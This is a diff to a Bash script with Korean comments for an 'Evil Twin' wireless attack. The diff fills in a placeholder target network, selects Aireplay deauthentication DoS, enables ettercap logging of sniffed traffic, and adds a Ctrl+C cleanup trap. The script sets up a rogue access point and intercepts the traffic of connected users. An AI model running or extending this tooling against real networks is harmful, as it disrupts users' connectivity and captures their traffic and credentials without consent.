@@ -9,17 +9,17 @@
 # ============================================================
 
 # --- 사용자 설정 (필수) ---
-interface=""               # AP로 사용할 무선 인터페이스 (예: wlan0)
-internet_interface=""      # 인터넷 연결 인터페이스 (예: eth0)
-phy_interface=""           # 물리 인터페이스 (예: phy0)
-bssid=""                   # 타겟 BSSID (예: AA:BB:CC:DD:EE:FF)
-essid=""                   # 타겟 ESSID (예: MyNetwork)
-channel=""                 # 타겟 채널 (예: 6)
-et_dos_attack=""           # DoS 공격 방식: mdk4 | Aireplay | "Auth DoS"
+interface="wlan0"          # AP로 사용할 무선 인터페이스
+internet_interface="eth0"  # 인터넷 연결 인터페이스
+phy_interface=""           # 물리 인터페이스 (비워두면 자동 감지)
+bssid="AA:BB:CC:DD:EE:FF"  # 타겟 BSSID
+essid="TargetNetwork"      # 타겟 ESSID
+channel="6"                # 타겟 채널
+et_dos_attack="Aireplay"   # DoS 공격 방식: mdk4 | Aireplay | "Auth DoS"
 mdk_command="mdk4"         # mdk3 또는 mdk4
 
 # --- 선택 설정 ---
-ettercap_log=0             # ettercap 로그 저장: 1=활성화
+ettercap_log=1             # ettercap 로그 저장: 1=활성화
 ettercap_logpath="/tmp/et_sniffing_captured.txt"
 dos_pursuit_mode=0         # DoS Pursuit Mode: 1=활성화
 mac_spoofing_desired=0     # MAC 스푸핑: 1=활성화
@@ -1270,8 +1270,24 @@ function restore_et_interface() {
 # 메인 함수
 # ============================================================
 
+function _et_cleanup() {
+	echo
+	echo "[*] Stopping Evil Twin attack..."
+	kill_et_windows
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		recover_current_channel
+	fi
+	restore_et_interface
+	if [ "${ettercap_log}" -eq 1 ]; then
+		parse_ettercap_log
+	fi
+	clean_tmpfiles
+	exit 0
+}
+
 function exec_et_sniffing_attack() {
 	debug_print
+	trap '_et_cleanup' SIGINT SIGTERM
 	set_hostapd_config
 	launch_fake_ap
 	set_network_interface_data
@@ -1284,17 +1300,8 @@ function exec_et_sniffing_attack() {
 	launch_et_control_window
 	write_et_processes
 	echo
-	echo "[*] Evil Twin Sniffing attack running. Press Enter to stop."
-	read -r
-	kill_et_windows
-	if [ "${dos_pursuit_mode}" -eq 1 ]; then
-		recover_current_channel
-	fi
-	restore_et_interface
-	if [ "${ettercap_log}" -eq 1 ]; then
-		parse_ettercap_log
-	fi
-	clean_tmpfiles
+	echo "[*] Evil Twin Sniffing attack running. Press Ctrl+C to stop."
+	while true; do sleep 1; done
 }
 
 # ============================================================
